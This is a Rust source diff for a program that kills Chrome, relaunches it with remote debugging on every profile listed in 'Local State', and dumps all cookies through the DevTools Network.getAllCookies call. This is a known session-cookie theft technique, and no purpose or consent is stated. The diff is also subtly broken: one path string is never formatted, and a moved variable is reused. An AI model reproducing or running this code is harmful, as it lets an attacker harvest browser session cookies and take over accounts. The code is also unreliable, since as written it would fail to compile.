@@ -1,3 +1,4 @@
+use std::fmt::format;
 use std::process::{Command, Stdio};
 use std::{env, fs};
 //use decrypt_cookies::{browser::info::ChromiumInfo, Browser, ChromiumBuilder};
@@ -21,31 +22,80 @@ const USER_DATA_DIR: &str = r#"\google\chrome\User Data"#;
 pub async fn main() -> Result<(), reqwest::Error> {
     dotenv().ok();
     kill_chrome();
-    start_debugged_chrome();
-    let url = get_debug_ws_url().await;
+    let localappdata = env::var("LOCALAPPDATA").unwrap();
+    let user_data_dir = localappdata + USER_DATA_DIR;
+    let local_state = fs::read_to_string(format!("{user_data_dir}\\Local State")).unwrap();
+    let v: Value = serde_json::from_str(&local_state).unwrap();
+    let profiles_raw = v["profile"]["info_cache"].clone();
+    for (profile, _) in profiles_raw.as_object().unwrap() {
+        start_debugged_chrome(localappdata + USER_DATA_DIR + "\\{profile}");
+        let url = get_debug_ws_url().await;
 
-    dbg!("{}", &url);
-    let url = Url::parse(&url).expect("Failed to parse WebSocket URL");
-    let (ws_stream, _) = connect_async(url).await.unwrap();
-    println!("Connected to WebSocket!");
-    let (mut sink, mut stream) = ws_stream.split();
-
-    sink.send(tungstenite::Message::text(
-        json!({
-            "id": 1,
-            "method": "Network.getAllCookies"
-        })
-        .to_string(),
-    ))
-    .await
-    .expect("ln 52");
-    if let Some(response) = stream.next().await {
-        match response {
-            Ok(msg) => println!("Received: {:?}", msg),
-            Err(e) => eprintln!("Error receiving message: {:?}", e),
+        dbg!("{}", &url);
+        let url = Url::parse(&url).expect("Failed to parse WebSocket URL");
+        let (ws_stream, _) = connect_async(url).await.unwrap();
+        println!("Connected to WebSocket!");
+        let (mut sink, mut stream) = ws_stream.split();
+        sink.send(tungstenite::Message::text(
+            json!({
+                "id": 1,
+                "method": "Network.enable"
+            })
+            .to_string(),
+        ))
+        .await
+        .expect("Failed to enable Network");
+        sink.send(tungstenite::Message::text(
+            json!({
+                "id": 1,
+                "method": "Network.getAllCookies"
+            })
+            .to_string(),
+        ))
+        .await
+        .expect("ln 52");
+        if let Some(response) = stream.next().await {
+            match response {
+                Ok(msg) => println!("Received: {:?}", msg),
+                Err(e) => eprintln!("Error receiving message: {:?}", e),
+            }
         }
+        kill_chrome();
     }
-    kill_chrome();
+
+    //   start_debugged_chrome();
+    //   let url = get_debug_ws_url().await;
+    //
+    //   dbg!("{}", &url);
+    //   let url = Url::parse(&url).expect("Failed to parse WebSocket URL");
+    //   let (ws_stream, _) = connect_async(url).await.unwrap();
+    //   println!("Connected to WebSocket!");
+    //   let (mut sink, mut stream) = ws_stream.split();
+    //   sink.send(tungstenite::Message::text(
+    //       json!({
+    //           "id": 1,
+    //           "method": "Network.enable"
+    //       })
+    //       .to_string(),
+    //   ))
+    //   .await
+    //   .expect("Failed to enable Network");
+    //   sink.send(tungstenite::Message::text(
+    //       json!({
+    //           "id": 1,
+    //           "method": "Network.getAllCookies"
+    //       })
+    //       .to_string(),
+    //   ))
+    //   .await
+    //   .expect("ln 52");
+    //   if let Some(response) = stream.next().await {
+    //       match response {
+    //           Ok(msg) => println!("Received: {:?}", msg),
+    //           Err(e) => eprintln!("Error receiving message: {:?}", e),
+    //       }
+    //   }
+    //   kill_chrome();
     Ok(())
 }
 
@@ -60,7 +110,7 @@ async fn get_debug_ws_url() -> String {
     let json_res: Value = serde_json::from_str(&body).unwrap();
     let websocket_debugger_url = json_res[0]["webSocketDebuggerUrl"].to_string();
     println!("{}", websocket_debugger_url);
-    websocket_debugger_url[1..websocket_debugger_url.len()-1].to_owned()
+    websocket_debugger_url[1..websocket_debugger_url.len() - 1].to_owned()
 }
 
 fn kill_chrome() {
@@ -74,9 +124,8 @@ fn kill_chrome() {
     }
 }
 
-fn start_debugged_chrome() {
+fn start_debugged_chrome(user_data_dir: String) {
     let localappdata = env::var("LOCALAPPDATA").unwrap();
-    let user_data_dir = localappdata + USER_DATA_DIR;
     let child = Command::new(CHROME_PATH)
         .args(&[
             &format!("--remote-debugging-port={}", DEBUG_PORT),
@@ -91,4 +140,3 @@ fn start_debugged_chrome() {
 
     println!("Chrome started with PID: {}", child.id());
 }
-
